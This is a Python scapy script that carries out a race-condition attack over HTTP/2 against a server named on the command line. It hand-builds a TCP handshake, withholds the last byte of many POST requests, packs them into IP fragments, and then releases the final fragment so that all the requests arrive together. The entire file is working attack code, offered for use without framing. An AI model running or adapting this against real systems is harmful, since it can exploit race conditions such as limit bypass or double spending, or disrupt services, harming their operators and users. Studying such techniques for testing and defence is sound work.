import time
from scapy.all import send, TCP, RandShort, IP, sr1, fragment
from scapy.contrib.http2 import H2_CLIENT_CONNECTION_PREFACE, H2Frame, H2SettingsFrame, H2Setting, HPackHdrTable, H2DataFrame, H2Seq
import argparse

parser = argparse.ArgumentParser()

parser.add_argument('ip', help='IP address of the server')
parser.add_argument('port', help='Port of the server', type=int)
parser.add_argument('amount', help='Amount of requests to send', type=int)

args = parser.parse_args() 

target_ip = args.ip
target_port = args.port

req_amount = args.amount

tcp = TCP(sport=int(RandShort()), dport=target_port, flags="S",
          seq=1000, window=65535)

ip = IP(dst=target_ip)

# SYN/ACK
syn = ip/tcp
syn_ack = sr1(syn)

tcp_window = syn_ack.window

print("Using %d as the TCP window size" % tcp_window)

tcp.seq += 1
tcp.ack = syn_ack.seq + 1
tcp.flags = 'A'
ack = ip/tcp
send(ack)

print("[+] Established the connection to the target!")

http2_preface = ip/tcp/H2_CLIENT_CONNECTION_PREFACE
send(http2_preface)
tcp.seq += len(H2_CLIENT_CONNECTION_PREFACE)

h2_settings = [
    # SETTINGS_HEADER_TABLE_SIZE
    H2Setting(id=1, value=4096),
    # SETTINGS_ENABLE_PUSH
    H2Setting(id=2, value=0),
    # SETTINGS_MAX_CONCURRENT_STREAMS
    H2Setting(id=3, value=2**32-1),
]

h2_settings_frame = H2Frame()/H2SettingsFrame(settings=h2_settings)
send(ip/tcp/h2_settings_frame)
tcp.seq += len(h2_settings_frame)

h2_settings_ack_frame = H2Frame(flags={'A'}) / H2SettingsFrame()
send(ip/tcp/h2_settings_ack_frame)
tcp.seq += len(h2_settings_ack_frame)

initial_frames = []
last_byte_frames = []
print("[+] Building frames...")
for i in range(req_amount):
    body = bytes(str(i), 'utf-8')
    h2_headers = [
        ('Content-Length', str(len(body))),
    ]

    special_headers = [
        (':method', 'POST'),
        (':scheme', 'http'),
        (':path', '/'),
        (':authority',  "%s:%d" % (target_ip, target_port)),
    ]

    special_headers_str = "\n".join([f"{k} {v}" for k, v in special_headers])

    headers_str = "\n".join([f"{k}: {v}" for k, v in h2_headers])
    stream_id = (i+1)*2-1
    http2_frame = HPackHdrTable().parse_txt_hdrs(bytes(special_headers_str+"\n" +
                                                       headers_str, 'utf-8'), stream_id=stream_id, body=body)
    # remove a last byte from http2_frame for the last byte sync
    data_frame = http2_frame.frames[-1]
    last_byte = data_frame.data[-1:]
    data_frame.flags.remove('ES')
    data_frame.data = data_frame.data[:-1]
    http2_frame.frames[-1] = data_frame

    initial_frames.append(http2_frame)

    last_byte_data_frame = H2Frame(stream_id=stream_id, flags={
                                   'ES'}) / H2DataFrame(data=last_byte)
    last_byte_frames.append(last_byte_data_frame)

print("[+] Packing the frames... (It may take a few minutes...)")

def pack_frames_to_seq(frames):
    packets = []
    current_seq = H2Seq()
    tcp_len = len(tcp)
    seq_len = len(current_seq)
    frames_len = 0
    for frame in frames:
        frames_len += len(frame)
        if tcp_len + seq_len + frames_len >= tcp_window:
            packets.append(fragment(ip/tcp/current_seq))
            tcp.seq += len(current_seq)
            tcp_len = len(tcp)
            current_seq = H2Seq()
            current_seq.frames.append(frame)
            frames_len = len(frame)
            continue
        else:
            current_seq.frames.append(frame)

    if len(current_seq.frames) != 0:
        packets.append(fragment(ip/tcp/current_seq))
        tcp.seq += len(current_seq)

    return packets

initial_packets = pack_frames_to_seq(initial_frames)
last_byte_packets = pack_frames_to_seq(last_byte_frames)

print("[+] Sending initial packets...")
for fragments in initial_packets:
    for frag in fragments:
        send(frag)


print("[+] Sending last byte packets...")
for fragments in last_byte_packets[1:]:
    for frag in fragments:
        send(frag)

fragments = last_byte_packets[0]
for frag in fragments[:-1]:
    send(frag)

print("[+] Sending the last packet in 3 seconds...")
time.sleep(3)
# send last packet
send(fragments[-1])

print("[+] Done!")

time.sleep(3)

special_headers = [
    (':method', 'GET'),
    (':scheme', 'http'),
    (':path', '/done'),
    (':authority', "%s:%d" % (target_ip, target_port)),
]

special_headers_str = "\n".join([f"{k} {v}" for k, v in special_headers])
stream_id = (req_amount+1)*2-1
http2_frame = HPackHdrTable().parse_txt_hdrs(
    bytes(special_headers_str, 'utf-8'), stream_id=stream_id)
send(ip/tcp/http2_frame)

